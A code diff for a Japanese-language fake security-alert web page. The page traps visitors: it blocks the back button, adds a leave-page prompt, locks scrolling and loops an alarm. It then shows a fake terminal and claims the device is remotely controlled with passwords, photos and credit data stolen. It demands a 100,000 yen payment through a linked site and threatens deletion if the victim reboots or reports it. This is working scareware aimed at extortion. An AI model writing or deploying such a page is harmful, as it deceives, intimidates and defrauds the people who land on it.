@@ -4,12 +4,17 @@
   <meta charset="UTF-8">
   <title>セキュリティ警告</title>
   <style>
-    body {
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
       background: black;
       color: red;
       font-family: 'Courier New', monospace;
       text-align: center;
-      overflow: hidden;
+      overflow-y: scroll;
+      overscroll-behavior: none;
+      touch-action: none;
     }
     h1 {
       font-size: 2em;
@@ -58,11 +63,10 @@
     }
   </style>
 </head>
-<body>
+<body onbeforeunload="return 'ページを離れるとデータは失われます。続けますか？';">
   <div class="flashing-bg"></div>
   <h1 id="message">スキャン中…</h1>
   <div class="terminal" id="terminal">C:\system32> _</div>
-
   <div id="chat" style="display: none;"></div>
 
   <audio id="alarm" autoplay loop>
@@ -71,12 +75,12 @@
   <audio id="beep" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>
 
   <script>
-    // 戻る防止
+    // 履歴遷移防止
     history.pushState(null, null, location.href);
     window.onpopstate = () => history.go(1);
 
     // タイピング演出
-    const warningText = "⚠️ ウイルスが検出されました。今すぐ対処してください。";
+    const warningText = "\u26a0\ufe0f ウイルスが検出されました。今すぐ対処してください。";
     let i = 0;
     function typeEffect() {
       if (i < warningText.length) {
@@ -86,7 +90,7 @@
       }
     }
 
-    // 疑似コマンド操作演出
+    // 擬似コマンド出力
     const terminalLines = [
       "C:\\system32> 調査中...",
       "C:\\system32> systemOverride.exe 起動",
@@ -102,19 +106,17 @@
         t++;
         setTimeout(fakeTerminal, 1000);
       } else {
-        // 警告文表示
         setTimeout(() => {
           const msgHTML = `
             <br><br>
-            💀 このデバイスは遠隔操作されています。パスワード、写真、クレジット情報、SNS履歴も含まれます。<br><br>
+            \uD83D\uDC80 このデバイスは遠隔操作されています。パスワード、写真、クレジット情報、SNS履歴も含まれます。<br><br>
             復号化には<strong>100,000円</strong>の振り込みが必要です。<br>
             支払い期限を過ぎると、データは完全に削除され復元不可能になります。<br><br>
-            📥 振込先: <a href="https://naji634.github.io/fakesite-v2/" target="_blank" style="color: cyan;">https://naji634.github.io/fakesite-v2/</a><br><br>
-            🔒 <strong>注意：</strong>再起動・電源オフ・第三者への通報は、即時データ削除の対象となります。
+            \uD83D\uDCE5 振込先: <a href="https://naji634.github.io/fakesite-v2/" target="_blank" style="color: cyan;">https://naji634.github.io/fakesite-v2/</a><br><br>
+            \uD83D\uDD10 <strong>注意：</strong>再起動・電源オフ・第三者への通報は、即時データ削除の対象となります。
           `;
           document.getElementById("message").innerHTML = msgHTML;
 
-          // チャット表示
           const chat = document.getElementById("chat");
           chat.style.display = "block";
 
@@ -138,7 +140,6 @@
       }
     }
 
-    // 実行
     window.onload = () => {
       document.getElementById("message").innerHTML = "";
       typeEffect();
